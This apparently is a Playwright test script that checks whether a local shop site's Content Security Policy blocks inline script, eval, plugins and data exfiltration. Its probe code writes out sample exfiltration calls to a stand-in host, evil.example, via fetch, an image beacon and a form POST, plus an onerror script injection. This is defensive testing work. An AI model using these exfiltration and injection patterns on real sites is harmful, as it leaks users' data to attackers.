"""Runtime CSP test: the browser must block inline script, eval, data exfiltration via fetch/image/form to foreign hosts,
and plugin content — on the shop and in the admin page."""
import asyncio, json
from playwright.async_api import async_playwright
JS = """async () => {
  const v = []; document.addEventListener('securitypolicyviolation', e => v.push(e.violatedDirective + ' ' + (e.blockedURI || '')));
  const r = {};
  window.__inl = 0; const s = document.createElement('script'); s.textContent = 'window.__inl = 1'; document.body.appendChild(s); r.inlineScriptBlocked = window.__inl === 0;
  try { eval('1+1'); r.evalBlocked = false; } catch (e) { r.evalBlocked = true; }
  try { await fetch('https://evil.example/steal?d=1', { mode: 'no-cors' }); r.fetchBlocked = false; } catch (e) { r.fetchBlocked = true; }
  await new Promise(res => { const i = new Image(); i.onload = i.onerror = res; i.src = 'https://evil.example/pixel.png?d=1'; setTimeout(res, 800); });
  const h = document.createElement('div'); h.innerHTML = '<img src=x onerror="window.__h=1">'; document.body.appendChild(h); await new Promise(res => setTimeout(res, 300)); r.inlineHandlerBlocked = !window.__h;
  const o = document.createElement('object'); o.data = 'https://evil.example/x.swf'; document.body.appendChild(o);
  const f = document.createElement('form'); f.action = 'https://evil.example/post'; f.method = 'post'; f.target = 'x'; document.body.appendChild(f); try { f.requestSubmit ? f.requestSubmit() : f.submit(); } catch (e) {}
  await new Promise(res => setTimeout(res, 700));
  r.imgExfilBlocked = v.some(x => x.startsWith('img-src') && x.includes('evil.example'));
  r.objectBlocked = v.some(x => x.startsWith('object-src'));
  r.formBlocked = v.some(x => x.startsWith('form-action'));
  r.violations = v;
  return r;
}"""
async def main():
    async with async_playwright() as pw:
        b = await pw.chromium.launch(executable_path='/usr/bin/google-chrome'); allok = True
        for page in ['index.html#/', 'admin.html#/admin']:
            p = await b.new_page(); evil = []; p.on('request', lambda q: evil.append(q.url) if 'evil.example' in q.url else None); await p.goto('http://localhost:8780/' + page); await p.wait_for_timeout(1500)
            r = await p.evaluate(JS); viol = r.pop('violations'); del r['evalBlocked']; del r['formBlocked']
            await p.goto('http://localhost:8780/' + page); await p.wait_for_timeout(1200)
            await p.evaluate("() => { const s = document.createElement('script'); s.src = '/__csp_probe.js'; document.body.appendChild(s); }")
            await p.wait_for_timeout(1500)
            pr = await p.evaluate("() => window.__cspProbe || {}")
            evil = [u for u in evil if '/post' in u]
            for k in ['evalBlocked', 'newFunctionBlocked', 'stringTimeoutBlocked', 'formBlocked']: r[k + ' (page script)'] = bool(pr.get(k))
            # criterion for the form: a form-action violation was reported AND no request reached the foreign host
            r['formBlocked (page script)'] = bool(pr.get('formBlocked')) and not evil
            for k, v in r.items(): print(('PASS ' if v else 'FAIL ') + f'{page:20} {k}'); allok &= bool(v)
            await p.close()
        print('RESULT:', 'PASS' if allok else 'FAIL'); await b.close()
asyncio.run(main())
